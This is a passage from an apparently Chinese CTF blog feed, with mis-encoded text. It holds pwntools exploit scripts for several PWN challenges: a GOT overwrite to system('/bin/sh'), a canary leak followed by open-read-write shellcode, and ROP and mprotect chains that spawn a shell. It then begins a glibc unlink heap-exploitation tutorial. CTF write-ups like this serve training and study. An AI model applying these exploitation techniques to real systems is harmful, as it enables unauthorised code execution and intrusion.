class="string">&#x27;chioce&gt;:&#x27;</span>, <span class="string">&#x27;5&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">&#x27;0x404018&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&#x27;massege:&#x27;</span>)</span><br><span class="line">libcbase = u64(io.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\0&#x27;</span>)) - libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">success(<span class="string">&#x27;libcbase =&gt;&gt; &#x27;</span> + <span class="built_in">hex</span>(libcbase))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">system = libcbase + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">printf = libcbase + libc.sym[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">menu</span>(<span class="params">num</span>): </span><br><span class="line">    io.sendlineafter(<span class="string">&quot;&lt;Your chioce&gt;:&quot;</span>,<span class="built_in">str</span>(num).encode())</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params"><span class="built_in">id</span></span>): </span><br><span class="line">    menu(<span class="number">3</span>) </span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Index: &quot;</span>,<span class="built_in">str</span>(<span class="built_in">id</span>).encode())</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edite</span>(<span class="params"><span class="built_in">id</span>,payload</span>): </span><br><span class="line">    menu(<span class="number">4</span>) </span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Index: &quot;</span>,<span class="built_in">str</span>(<span class="built_in">id</span>).encode()) </span><br><span class="line">    io.sendafter(<span class="string">&quot;message:&quot;</span>,payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">name,introduce</span>):</span><br><span class="line">    menu(<span class="number">1</span>) </span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Your name:&quot;</span>,name) </span><br><span class="line">    io.sendafter(<span class="string">&quot;Introduce:&quot;</span>,introduce)</span><br><span class="line"></span><br><span class="line">edite(-<span class="number">4</span>,p64(<span class="number">0</span>)+p64(printf)+p64(system))  <span class="comment">#ä¸€ä¸ªç»“æ„ä½“0x30ï¼Œå†™introå†+0x10</span></span><br><span class="line">add(<span class="string">b&#x27;/bin/sh&#x27;</span>,<span class="string">b&#x27;a&#x27;</span>) </span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h3 id="orzï¼Ÿorwï¼"><a href="#orzï¼Ÿorwï¼" class="headerlink" title="orzï¼Ÿorwï¼"></a>orzï¼Ÿorwï¼</h3><p><img src="/2025/03/25/PWN%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0%EF%BC%88%E9%95%BF%E6%9C%9F%E6%9B%B4%E6%96%B0%EF%BC%89/Pasted image 20250308120612.png" alt="Pasted image 20250308120612"><br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">filename = <span class="string">&#x27;./orw&#x27;</span></span><br><span class="line"></span><br><span class="line">debug = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    io = remote(<span class="string">&#x27;nc1.ctfplus.cn&#x27;</span>, <span class="number">18839</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = process(filename)</span><br><span class="line"></span><br><span class="line">elf = ELF(filename)</span><br><span class="line">context(arch = elf.arch, log_level = <span class="string">&#x27;debug&#x27;</span>, os = <span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dbg</span>():</span><br><span class="line">    gdb.attach(io)</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">&#x27;size:&#x27;</span>, <span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">io.sendafter(<span class="string">&#x27;name:&#x27;</span>,(<span class="string">b&#x27;1&#x27;</span>).ljust(<span class="number">0x11</span>-<span class="number">7</span>,<span class="string">b&#x27;a&#x27;</span>))</span><br><span class="line"></span><br><span class="line">size = <span class="built_in">len</span>(<span class="string">&quot;Hello 1aaaaaaaa&quot;</span>) </span><br><span class="line">res = io.recvline()</span><br><span class="line">res = io.recvline()</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;res&quot;</span>,res) </span><br><span class="line">canary = u64(res[size:size+<span class="number">8</span>]) </span><br><span class="line">canary -=<span class="number">0x61</span></span><br><span class="line">success(<span class="string">&#x27;canary =&gt;&gt; &#x27;</span> + <span class="built_in">hex</span>(canary))</span><br><span class="line"></span><br><span class="line">io.sendafter(<span class="string">&#x27;id&#x27;</span>,<span class="string">b&#x27;A&#x27;</span> * <span class="number">4</span> + p64(canary) + <span class="string">b&#x27;A&#x27;</span> * <span class="number">8</span> + p64(<span class="number">0x4012A7</span>) + asm(shellcraft.<span class="built_in">open</span>(<span class="string">&#x27;./flag&#x27;</span>, <span class="number">0</span>) + shellcraft.read(<span class="number">3</span>, <span class="number">0x404500</span>, <span class="number">0x100</span>) + shellcraft.write(<span class="number">1</span>, <span class="number">0x404500</span>, <span class="number">0x100</span>)))</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure></p><h2 id="CISCN"><a href="#CISCN" class="headerlink" title="CISCN"></a>CISCN</h2><h3 id="2023-Shaokao"><a href="#2023-Shaokao" class="headerlink" title="2023 Shaokao"></a>2023 Shaokao</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">context.terminal = [<span class="string">&quot;tmux&quot;</span>, <span class="string">&quot;splitw&quot;</span>, <span class="string">&quot;-h&quot;</span>]</span><br><span class="line">p=process(<span class="string">&quot;./shaokao&quot;</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./shaokao&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">choose</span>(<span class="params">choice</span>):</span><br><span class="line">    p.recvuntil(<span class="string">&quot;&gt;&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(choice))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">buy</span>():</span><br><span class="line">    choose(<span class="number">1</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;å¤©æ¶¯\n&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    p.recvuntil(<span class="string">&quot;ï¼Ÿ\n&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(-<span class="number">10000</span>))</span><br><span class="line"></span><br><span class="line">buy()</span><br><span class="line">choose(<span class="number">3</span>)</span><br><span class="line">choose(<span class="number">4</span>)</span><br><span class="line">choose(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;/bin/sh\x00&#x27;</span>+<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x20</span>+p64(<span class="number">0x40264f</span>)+p64(<span class="number">0x4E60F0</span>)+p64(<span class="number">0x40a67e</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0x4a404b</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0</span>)</span><br><span class="line">payload+=p64(<span class="number">0x458827</span>)+p64(<span class="number">59</span>)+p64(<span class="number">0x402404</span>)</span><br><span class="line">p.sendafter(<span class="string">&quot;èµåï¼š\n&quot;</span>,payload)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">rdi=binshåœ°å€,rsi=0,rdx=0ï¼Œrax=59ï¼Œsyscall</span></span><br><span class="line"><span class="string">0x0000000000458827 : pop rax ; ret</span></span><br><span class="line"><span class="string">0x000000000040264f : pop rdi ; ret</span></span><br><span class="line"><span class="string">0x000000000040a67e : pop rsi ; ret</span></span><br><span class="line"><span class="string">0x00000000004a404b : pop rdx ; pop rbx ; ret</span></span><br><span class="line"><span class="string">0x0000000000402404 : syscall</span></span><br><span class="line"><span class="string">name=0x4E60F0</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><h2 id="é’æµ·æ°‘æ—å¤§å­¦"><a href="#é’æµ·æ°‘æ—å¤§å­¦" class="headerlink" title="é’æµ·æ°‘æ—å¤§å­¦"></a>é’æµ·æ°‘æ—å¤§å­¦</h2><h3 id="System"><a href="#System" class="headerlink" title="System"></a>System</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p=process(<span class="string">&#x27;./system&#x27;</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./system&#x27;</span>)</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#é™æ€ç¼–è¯‘ï¼ŒIDAæŸ¥çœ‹å³å¯</span></span><br><span class="line">open_addr = <span class="number">0x0806D020</span></span><br><span class="line">read_addr = <span class="number">0x0806D090</span></span><br><span class="line">write_addr = <span class="number">0x0806D100</span></span><br><span class="line">bss_addr = <span class="number">0x080EB000</span></span><br><span class="line">put_addr = <span class="number">0x0804F7E0</span>  </span><br><span class="line">ret=<span class="number">0x080481b2</span></span><br><span class="line">pop1ret=<span class="number">0x0804846f</span></span><br><span class="line">pop3ret=<span class="number">0x0806336b</span></span><br><span class="line">pop2ret=<span class="number">0x0805c508</span></span><br><span class="line">sh=<span class="number">0x080BE408</span></span><br><span class="line">mprotect=<span class="number">0x0806DBB0</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#========orw============</span></span><br><span class="line"><span class="comment"># payload = b&#x27;A&#x27; * 112</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># payload += p32(put_addr)</span></span><br><span class="line"><span class="comment"># payload += p32(pop1ret)</span></span><br><span class="line"><span class="comment"># payload += p32(sh)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># payload += p32(read_addr)</span></span><br><span class="line"><span class="comment"># payload += p32(pop3ret)</span></span><br><span class="line"><span class="comment"># payload += p32(0)</span></span><br><span class="line"><span class="comment"># payload += p32(bss_addr)</span></span><br><span class="line"><span class="comment"># payload += p32(8)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># # open(bss_addr, 0)</span></span><br><span class="line"><span class="comment"># payload += p32(open_addr)</span></span><br><span class="line"><span class="comment"># payload += p32(pop2ret)</span></span><br><span class="line"><span class="comment"># payload += p32(bss_addr)</span></span><br><span class="line"><span class="comment"># payload += p32(0)      </span></span><br><span class="line"></span><br><span class="line"><span class="comment"># # read(fd, bss_addr, 100)</span></span><br><span class="line"><span class="comment"># payload += p32(read_addr)</span></span><br><span class="line"><span class="comment"># payload += p32(pop3ret)</span></span><br><span class="line"><span class="comment"># payload += p32(3)</span></span><br><span class="line"><span class="comment"># payload += p32(bss_addr)</span></span><br><span class="line"><span class="comment"># payload += p32(100)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># # write(1, bss_addr, 100)</span></span><br><span class="line"><span class="comment"># payload += p32(write_addr)</span></span><br><span class="line"><span class="comment"># payload += p32(ret)</span></span><br><span class="line"><span class="comment"># payload += p32(1) </span></span><br><span class="line"><span class="comment"># payload += p32(bss_addr)</span></span><br><span class="line"><span class="comment"># payload += p32(100)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># p.sendline(payload)</span></span><br><span class="line"><span class="comment"># p.sendlineafter(b&#x27;/bin/sh&#x27;,b&#x27;/flag\x00&#x27;)</span></span><br><span class="line"><span class="comment"># p.interactive()</span></span><br><span class="line"><span class="comment">#=======================</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#========mprotect=======</span></span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span> * <span class="number">112</span></span><br><span class="line">payload += p32(mprotect)</span><br><span class="line">payload += p32(pop3ret)</span><br><span class="line">payload += p32(bss_addr)</span><br><span class="line">payload += p32(<span class="number">0x1000</span>)</span><br><span class="line">payload += p32(<span class="number">7</span>)</span><br><span class="line"></span><br><span class="line">payload += p32(put_addr)</span><br><span class="line">payload += p32(pop1ret)</span><br><span class="line">payload += p32(sh)</span><br><span class="line"></span><br><span class="line">payload += p32(read_addr)</span><br><span class="line">payload += p32(bss_addr)</span><br><span class="line">payload += p32(<span class="number">0</span>)</span><br><span class="line">payload += p32(bss_addr)</span><br><span class="line">payload += p32(<span class="built_in">len</span>(asm(shellcraft.sh())))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">payload2=asm(shellcraft.sh())</span><br><span class="line">p.sendafter(<span class="string">b&#x27;/bin/sh\n&#x27;</span>,payload2)</span><br><span class="line">p.interactive()</span><br><span class="line"><span class="comment">#=======================</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> PWN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PWN </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>unlink</title>
      <link href="/2025/03/11/unlink/"/>
      <url>/2025/03/11/unlink/</url>
      
        <content type="html"><![CDATA[<h2 id="unlink"><a href="#unlink" class="headerlink" title="unlink"></a>unlink</h2><h3 id="unlinkæ˜¯ä»€ä¹ˆï¼Ÿ"><a href="#unlinkæ˜¯ä»€ä¹ˆï¼Ÿ" class="headerlink" title="unlinkæ˜¯ä»€ä¹ˆï¼Ÿ"></a>unlinkæ˜¯ä»€ä¹ˆï¼Ÿ</h3><p><a href="https://ftp.gnu.org/gnu/glibc/">Index of /gnu/glibc</a></p><p>unlinkå…¶å®æ˜¯libcä¸­å®šä¹‰çš„ä¸€ä¸ªå®ï¼Œå®šä¹‰å¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> unlink(AV, P, BK, FD) &#123;                                            </span></span><br><span class="line">    FD = P-&gt;fd;      </span><br><span class="line">    BK = P-&gt;bk;      </span><br><span class="line">    <span class="keyword">if</span> (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, <span class="number">0</span>))      </span><br><span class="line">      malloc_printerr (check_action, <span class="string">&quot;corrupted double-linked list&quot;</span>, P, AV);  </span><br><span class="line">    <span class="keyword">else</span> &#123;      </span><br><span class="line">        FD-&gt;bk = BK;      </span><br><span class="line">        BK-&gt;fd = FD;      </span><br><span class="line">        <span class="keyword">if</span> (!in_smallbin_range (P-&gt;size)      </span><br><span class="line">            &amp;&amp; __builtin_expect (P-&gt;fd_nextsize != <span class="literal">NULL</span>, <span class="number">0</span>)) &#123;      </span><br><span class="line">    <span class="keyword">if</span> (__builtin_expect (P-&gt;fd_nextsize-&gt;bk_nextsize != P, <span class="number">0</span>)      </span><br><span class="line">|| __builtin_expect (P-&gt;bk_nextsize-&gt;fd_nextsize != P, <span class="number">0</span>))    </span><br><span class="line">      malloc_printerr (check_action,      </span><br><span class="line">       <span class="string">&quot;corrupted double-linked list (not small)&quot;</span>,    </span><br><span class="line">       P, AV);      </span><br><span class="line">            <span class="keyword">if</span> (FD-&gt;fd_nextsize == <span class="literal">NULL</span>) &#123;      </span><br><span class="line">                <span class="keyword">if</span> (P-&gt;fd_nextsize == P)      </span><br><span class="line">                  FD-&gt;fd_nextsize = FD-&gt;bk_nextsize = FD;      </span><br><span class="line">                <span class="keyword">else</span> &#123;      </span><br><span class="line">                    FD-&gt;fd_nextsize = P-&gt;fd_nextsize;      </span><br><span class="line">                    FD-&gt;bk_nextsize = P-&gt;bk_nextsize;      </span><br><span class="line">                    P-&gt;fd_nextsize-&gt;bk_nextsize = FD;      </span><br><span class="line">                    P-&gt;bk_nextsize-&gt;fd_nextsize = FD;      </span><br><span class="line">                  &#125;      </span><br><span class="line">              &#125; <span class="keyword">else</span> &#123;      </span><br><span class="line">                P-&gt;fd_nextsize-&gt;bk_nextsize = P-&gt;bk_nextsize;      </span><br><span class="line">                P-&gt;bk_nextsize-&gt;fd_nextsize = P-&gt;fd_nextsize;      </span><br><span class="line">              &#125;      </span><br><span class="line">          &#125;      </span><br><span class="line">      &#125;      </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="ä½•æ—¶æ‰§è¡Œunlink"><a href="#ä½•æ—¶æ‰§è¡Œunlink" class="headerlink" title="ä½•æ—¶æ‰§è¡Œunlink"></a>ä½•æ—¶æ‰§è¡Œunlink</h3><p>åœ¨æ‰§è¡Œfree()å‡½æ•°æ—¶æ‰§è¡Œäº† _int_free()å‡½æ•°ï¼Œåœ¨_int_free()å‡½æ•°ä¸­è°ƒç”¨äº†unlinkå®ï¼Œå¤§æ¦‚çš„æ„æ€å¦‚ä¸‹ï¼ˆæ³¨æ„_int_free()æ˜¯å‡½æ•°ä¸æ˜¯å®ï¼‰ï¼š</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> unlink(AV, P, BK, FD)</span></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> _int_free (mstate av, mchunkptr p, <span class="type">int</span> have_lock)</span><br><span class="line"><span class="built_in">free</span>()&#123;</span><br><span class="line">_int_free()&#123;</span><br><span class="line">unlink();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="å †é‡Šæ”¾"><a href="#å †é‡Šæ”¾" class="headerlink" title="å †é‡Šæ”¾"></a>å †é‡Šæ”¾</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"> <span class="number">1</span> <span class="comment">//gcc -g test.c -o test</span></span><br><span class="line"> <span class="number">2</span> <span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"> <span class="number">3</span> </span><br><span class="line"> <span class="number">4</span> <span class="type">void</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line"> <span class="number">5</span>         <span class="type">long</span> *chunk1 = <span class="built_in">malloc</span>(<span class="number">0x80</span>);</span><br><span class="line"> <span class="number">6</span>         <span class="type">long</span> *first_chunk = <span class="built_in">malloc</span>(<span class="number">0x80</span>);</span><br><span class="line"> <span class="number">7</span>         <span class="type">long</span> *chunk3 = <span class="built_in">malloc</span>(<span class="number">0x80</span>);</span><br><span class="line"> <span class="number">8</span>         <span class="type">long</span> *second_chunk = <span class="built_in">malloc</span>(<span class="number">0x80</span>);</span><br><span class="line"> <span class="number">9</span>         <span class="type">long</span> *chunk5 = <span class="built_in">malloc</span>(<span class="number">0x80</span>);</span><br><span class="line"><span class="number">10</span>         <span class="type">long</span> *third_chunk = <span class="built_in">malloc</span>(<span class="number">0x80</span>);</span><br><span class="line"><span class="number">11</span>         <span class="type">long</span> *chunk7 = <span class="built_in">malloc</span>(<span class="number">0x80</span>);</span><br><span class="line"><span class="number">12</span>         </span><br><span class="line"><span class="number">13</span>         <span class="built_in">free</span>(first_chunk);</span><br><span class="line"><span class="number">14</span>         <span class="built_in">free</span>(second_chunk);</span><br><span class="line"><span class="number">15</span>         <span class="built_in">free</span>(third_chunk);</span><br><span class="line"><span class="number">16</span>  </span><br><span class="line"><span class="number">17</span>         <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"><span class="number">18</span> &#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œç”³è¯·äº†7ä¸ªchunkï¼Œæ¥ç€ä¾æ¬¡é‡Šæ”¾äº†first_chunkã€second_chunkã€third_chunkã€‚è¿™é‡Œä¸ºä»€ä¹ˆé‡Šæ”¾è¿™å‡ ä¸ªchunkå‘¢ï¼Œ<strong><em>å› ä¸ºåœ°å€ç›¸é‚»çš„chunké‡Šæ”¾ä¹‹åä¼šè¿›è¡Œåˆå¹¶</em></strong>ï¼Œåœ°å€ä¸ç›¸é‚»çš„æ—¶å€™ä¸ä¼šåˆå¹¶ã€‚ç”±äºç”³è¯·çš„æ˜¯0x80çš„chunkï¼Œæ‰€ä»¥åœ¨é‡Šæ”¾ä¹‹åä¸ä¼šè¿›fastbinè€Œæ˜¯å…ˆè¿›unsortbinã€‚</p><ul><li>first_bk -&gt; second</li><li>second_fd -&gt; first ã€ second_bk -&gt; third</li><li>third_fd -&gt; second</li></ul><p><img src="/2025/03/11/unlink/image-20250406114803978.png" alt="image-20250406114803978"></p><p>unlinkå…¶å®æ˜¯æƒ³æŠŠsecond_chunkæ‘˜æ‰ï¼Œå¦‚æœsecond_chunkè¢«æ‘˜æ‰ï¼Œé‚£ä¹ˆå°±ä¼šå˜æˆä¸‹é¢è¿™æ ·ï¼š</p><p><img src="/2025/03/11/unlink/image-20250406114927945.png" alt="image-20250406114927945"></p><h3 id="chunkçŠ¶æ€æ£€æŸ¥"><a href="#chunkçŠ¶æ€æ£€æŸ¥" class="headerlink" title="chunkçŠ¶æ€æ£€æŸ¥"></a>chunkçŠ¶æ€æ£€æŸ¥</h3><p>ç°åœ¨æˆ‘ä»¬ç”¨çš„å¤§å¤šæ•°linuxéƒ½ä¼šå¯¹chunkçŠ¶æ€è¿›è¡Œæ£€æŸ¥ï¼Œä»¥å…é€ æˆäºŒæ¬¡é‡Šæ”¾æˆ–è€…äºŒæ¬¡ç”³è¯·çš„é—®é¢˜ã€‚</p><p>ä½†æ˜¯æ£€æŸ¥çš„æµç¨‹æœ¬èº«å°±å­˜åœ¨ä¸€äº›é—®é¢˜ï¼Œèƒ½å¤Ÿè®©æˆ‘ä»¬è¿›è¡Œåˆ©ç”¨ã€‚å›é¡¾ä¸€ä¸‹ä»¥å¾€æˆ‘ä»¬åšçš„é¢˜ï¼Œå¤§éƒ¨åˆ†éƒ½æ˜¯é¡ºç€åŸæœ‰çš„æ‰§è¡Œæµç¨‹èµ°ï¼Œä½†æ˜¯é€šè¿‡ä¿®æ”¹æ‰§è¡Œæ‰€ç”¨çš„æ•°æ®æ¥æ”¹å˜æ‰§è¡Œèµ°å‘ã€‚unlinkåŒæ ·å¯ä»¥ä»¥è¿™ç§æ–¹å¼è¿›è¡Œåˆ©ç”¨ï¼Œç”±äºunlinkæ˜¯åœ¨free()å‡½æ•°ä¸­è°ƒç”¨çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬åªçœ‹chunkç©ºé—²æ—¶éƒ½éœ€è¦æ£€æŸ¥å†™ä»€ä¹ˆ</p><h4 id="check1"><a href="#check1" class="headerlink" title="check1"></a>check1</h4><p>æ£€æŸ¥ä¸è¢«é‡Šæ”¾chunkç›¸é‚»é«˜åœ°å€çš„chunkçš„prevsizeçš„å€¼æ˜¯å¦ç­‰äºè¢«é‡Šæ”¾chunkçš„sizeå¤§å°</p><blockquote><p>å¦‚æœä¸€ä¸ªå—å±äºç©ºé—²çŠ¶æ€ï¼Œé‚£ä¹ˆç›¸é‚»é«˜åœ°å€å—çš„prev_sizeä¸ºå‰ä¸€ä¸ªå—çš„å¤§å°</p></blockquote><h4 id="check2"><a href="#check2" class="headerlink" title="check2"></a>check2</h4><p>æ£€æŸ¥ä¸è¢«é‡Šæ”¾chunkç›¸é‚»é«˜åœ°å€çš„chunkçš„sizeçš„Pæ ‡å¿—ä½æ˜¯å¦ä¸º0</p><blockquote><p>å¦‚æœä¸€ä¸ªå—å±äºç©ºé—²çŠ¶æ€ï¼Œé‚£ä¹ˆç›¸é‚»é«˜åœ°å€å—çš„sizeçš„Pæ ‡å¿—ä½ä¸º0ï¼Œ</p></blockquote><h4 id="check3"><a href="#check3" class="headerlink" title="check3"></a>check3</h4><p>æ£€æŸ¥å‰åè¢«é‡Šæ”¾chunkçš„fdå’Œbk</p><p>æ£€æŸ¥å‰ä¸€ä¸ªé‡Šæ”¾çš„bkæ˜¯å¦æŒ‡å‘è‡ªå·±ï¼Œåä¸€ä¸ªçš„fdæ˜¯å¦æŒ‡å‘è‡ªå·±</p><h2 id="ä¾‹é¢˜"><a href="#ä¾‹é¢˜" class="headerlink" title="ä¾‹é¢˜"></a>ä¾‹é¢˜</h2><p><img src="/2025/03/11/unlink/image-20250406130144366.png" alt="image-20250406130144366"></p><p>å¾ˆæ€ªçš„ç¨‹åºï¼Œæ²¡æœ‰ä»»ä½•æç¤ºæˆ–èœå•ï¼Œåªèƒ½é™æ€åˆ†æï¼Œæ“ä½œæˆåŠŸæ‰æœ‰å›æ˜¾</p><h3 id="é™æ€åˆ†æ"><a href="#é™æ€åˆ†æ" class="headerlink" title="é™æ€åˆ†æ"></a>é™æ€åˆ†æ</h3><h4 id="create"><a href="#create" class="headerlink" title="create"></a>create</h4><p><img src="/2025/03/11/unlink/image-20250406131242513.png" alt="image-20250406131242513"></p><h4 id="edit"><a href="#edit" class="headerlink" title="edit"></a>edit</h4><p><img src="/2025/03/11/unlink/image-20250406131731627.png" alt="image-20250406131731627"></p><p>è¾“å…¥æ•°æ®é•¿åº¦æ²¡åšæ£€æµ‹ï¼Œ<strong>å †æº¢å‡ºè­¦å‘Š</strong></p><h4 id="delete"><a href="#delete" class="headerlink" title="delete"></a>delete</h4><p><img src="/2025/03/11/unlink/image-20250406131829231.png" alt="image-20250406131829231"></p><p>æŒ‡é’ˆç½®ç©ºï¼Œæ— uaf</p><h4 id="check"><a href="#check" class="headerlink" title="check"></a>check</h4><p>æ£€æŸ¥æ˜¯å¦è¢«ä½¿ç”¨</p><p><img src="/2025/03/11/unlink/image-20250406132244324.png" alt="image-20250406132244324"></p><h3 id="åŠ¨æ€è°ƒè¯•"><a href="#åŠ¨æ€è°ƒè¯•" class="headerlink" title="åŠ¨æ€è°ƒè¯•"></a>åŠ¨æ€è°ƒè¯•</h3><p>åˆ›å»º3ä¸ªå †å—è¯•è¯•ï¼Œç»“æœå‘ç°å‡ºç°äº†6ä¸ªï¼ˆåŠ ä¸Štop_chunkçš„è¯ç†åº”å‡ºç°4ä¸ªï¼‰ï¼Œå¤šå‡ºæ¥çš„ä¸¤ä¸ªchunkå…¶å®æ˜¯ç”±äºç¨‹åºæœ¬èº«æ²¡æœ‰è¿›è¡Œ setbuf æ“ä½œï¼Œæ‰€ä»¥åœ¨æ‰§è¡Œè¾“å…¥è¾“å‡ºæ“ä½œçš„æ—¶å€™ä¼šç”³è¯·ç¼“å†²åŒºï¼Œå³åˆæ¬¡ä½¿ç”¨fget()å‡½æ•°å’Œprintf()å‡½æ•°çš„æ—¶å€™</p><p><img src="/2025/03/11/unlink/image-20250406133025014.png" alt="image-20250406133025014"></p><p>è¿™æ ·ä¸€æ¥æˆ‘ä»¬å¯èƒ½å°±æ— æ³•å †chunk1åšä»€ä¹ˆæ“ä½œäº†ï¼Œå› ä¸ºchunk1æ˜¯è¢«ä¸¤ä¸ªio_chunkåŒ…å›´ä½çš„ï¼Œæˆ‘ä»¬ä¹Ÿä¸èƒ½å¤Ÿæ§åˆ¶io_chunkã€‚å³ä½¿ä¸€å®šè¦åˆ©ç”¨chunk1çš„è¯ä¹Ÿåªèƒ½å…ˆé€šè¿‡å †æº¢å‡ºå…ˆè¦†ç›–io_chunkï¼Œä½†æ˜¯è¿™æ ·å¤ªéº»çƒ¦äº†ã€‚æ‰€ä»¥æˆ‘ä»¬å¯ä»¥è€ƒè™‘æ›´åŠ å®¹æ˜“åˆ©ç”¨çš„chunk2å’Œchunk3ï¼Œç”±chunk2æº¢å‡ºè‡³chunk3ï¼Œä¹Ÿæ–¹ä¾¿æ§åˆ¶æµç¨‹èµ°å‘</p><h3 id="åˆ›å»ºfake-chunk"><a href="#åˆ›å»ºfake-chunk" class="headerlink" title="åˆ›å»ºfake_chunk"></a>åˆ›å»ºfake_chunk</h3><p>åˆ©ç”¨unlinkï¼ŒåŠ¿å¿…è¦æœ‰ä¸€ä¸ªç©ºé—²å—ã€‚å¯ä»¥æ„é€ ç©ºé—²å—ã€‚å¦‚æœæˆ‘ä»¬åœ¨chunk2çš„dataéƒ¨åˆ†ä¼ªé€ ä¸€ä¸ªfake_chunkï¼Œå¹¶ä¸”è¿™ä¸ªfake_chunkå¤„äºé‡Šæ”¾çŠ¶æ€ã€‚é€šè¿‡å †æº¢å‡ºçš„æ–¹å¼å’Œä¿®æ”¹chunk3çš„prev_sizeå’Œsizeçš„Pæ ‡å¿—ä½ï¼Œé‡Šæ”¾chunk3çš„æ—¶å‘å‰åˆå¹¶ï¼Œè¿™æ ·å°±èƒ½è§¦å‘unlinkäº†ï¼š</p><blockquote><p>åœ°å€ç›¸é‚»çš„chunké‡Šæ”¾ä¹‹åä¼šè¿›è¡Œåˆå¹¶</p></blockquote><p><img src="/2025/03/11/unlink/image-20250406133433214.png" alt="image-20250406133433214"></p><p>æ”¾åœ¨chunk2çš„dataå—çš„chunkå¤§å°è‡³å°‘ä¸º0x30</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0x8(prev_size) + 0x8(size) + 0x8(fd) + 0x8(bk) + 0x8(next_prev) + 0x8(next_size) = 